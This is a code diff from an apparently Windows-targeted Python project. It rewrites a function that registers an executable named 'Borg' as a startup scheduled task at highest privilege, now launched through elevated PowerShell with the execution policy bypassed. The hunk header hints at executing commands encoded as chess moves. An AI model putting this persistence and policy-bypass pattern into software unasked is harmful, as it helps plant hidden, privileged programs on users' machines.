@@ -56,22 +56,19 @@ def translate_and_execute_chess_moves(chess_moves, codex_file):
 # Function to add the executable to Windows startup via registry
 def add_to_startup(executable_path, app_name="BorgApp"):
     try:
-        # Dynamically use the executable path
-        cmd = [
-            'schtasks', '/Create', '/SC', 'ONSTART', 
-            '/TN', 'Borg', 
-            '/TR', f'"{executable_path}"',  # Ensure the executable path is quoted
-            '/RU', 'NT AUTHORITY\\LOCALSERVICE', 
-            '/RL', 'HIGHEST'
-        ]
+        # Prepare the schtasks command
+        schtasks_cmd = f'schtasks /Create /SC ONSTART /TN "Borg" /TR "{executable_path}" /RU "NT AUTHORITY\\LOCALSERVICE" /RL HIGHEST /F'
 
-        print(f"Running schtasks command: {' '.join(cmd)}")  # Debugging print
+        # Build PowerShell command to run with elevated privileges
+        ps_command = f'Start-Process powershell -ArgumentList \'-NoProfile -ExecutionPolicy Bypass -Command "{schtasks_cmd}"\' -Verb RunAs'
 
-        # Run the command to create the scheduled task
-        result = subprocess.run(cmd, capture_output=True, text=True)
+        print(f"Running elevated PowerShell command: {ps_command}")  # Debugging print
 
-        print("Command output:", result.stdout)
-        print("Command error (if any):", result.stderr)
+        # Execute the PowerShell command
+        result = subprocess.run(['powershell.exe', '-Command', ps_command], capture_output=True, text=True)
+
+        print("PowerShell output:", result.stdout)
+        print("PowerShell error (if any):", result.stderr)
 
         if result.returncode == 0:
             print(f"Successfully added {executable_path} to Task Scheduler.")
